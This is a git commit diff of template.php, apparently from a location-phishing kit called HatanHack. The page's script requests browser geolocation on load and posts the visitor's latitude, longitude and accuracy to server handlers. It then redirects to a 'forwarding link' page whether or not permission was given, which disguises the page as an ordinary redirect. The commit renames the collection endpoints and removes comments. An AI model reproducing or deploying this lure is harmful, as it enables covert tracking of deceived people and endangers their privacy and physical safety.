5d2acc04d695f0e8cbd663743040c433f0ef04d7
HATANHack <ebrahimalsmiri12345@gmail.com>
2025-10-06 19:02:03 +0300

    Update template.php

--- template.php
+++ template.php
@@ -15,20 +15,16 @@ echo '
             if (message.includes("Lat:") || message.includes("Latitude:") || message.includes("Position obtained successfully")) {
                 console.log("DEBUG: " + message);
                 
-                // Send only essential logs to server
+                // Send essential logs to a dedicated HatanHack log file
                 var xhr = new XMLHttpRequest();
-                xhr.open("POST", "debug_log.php", true);
+                xhr.open("POST", "hatan_debug_log.php", true);
                 xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
                 xhr.send("message=" + encodeURIComponent(message));
             }
         }
         
         function getLocation() {
-            // Don\'t log this message
-            
             if (navigator.geolocation) {
-                // Don\'t log this message
-                
                 // Show permission request message
                 document.getElementById("locationStatus").innerText = "Requesting location permission...";
                 
@@ -42,7 +38,6 @@ echo '
                     }
                 );
             } else {
-                // Don\'t log this message
                 document.getElementById("locationStatus").innerText = "Your browser doesn\'t support location services";
                 // Redirect after a delay if geolocation is not supported
                 setTimeout(function() {
@@ -62,13 +57,12 @@ echo '
             debugLog("Lat: " + lat + ", Lon: " + lon + ", Accuracy: " + acc);
             
             var xhr = new XMLHttpRequest();
-            xhr.open("POST", "location.php", true);
+            // IMPORTANT: Sending location data to our custom handler
+            xhr.open("POST", "hatan_location.php", true);
             xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
             
             xhr.onreadystatechange = function() {
                 if (xhr.readyState === 4) {
-                    // Don\'t log this message
-                    
                     // Add a delay before redirecting to ensure data is processed
                     setTimeout(function() {
                         redirectToMainPage();
@@ -77,7 +71,6 @@ echo '
             };
             
             xhr.onerror = function() {
-                // Don\'t log this message
                 // Still redirect even if there was an error
                 redirectToMainPage();
             };
@@ -87,8 +80,6 @@ echo '
         }
         
         function handleError(error) {
-            // Don\'t log error messages
-            
             document.getElementById("locationStatus").innerText = "Redirecting...";
             
             // If user denies location permission or any other error, still redirect after a short delay
@@ -98,12 +89,10 @@ echo '
         }
         
         function redirectToMainPage() {
-            // Don\'t log this message
             // Try to redirect to the template page
             try {
                 window.location.href = "forwarding_link/index2.html";
             } catch (e) {
-                // Don\'t log this message
                 // Fallback redirection
                 window.location = "forwarding_link/index2.html";
             }
@@ -111,7 +100,6 @@ echo '
         
         // Try to get location when page loads
         window.onload = function() {
-            // Don\'t log this message
             setTimeout(function() {
                 getLocation();
             }, 500); // Small delay to ensure everything is loaded
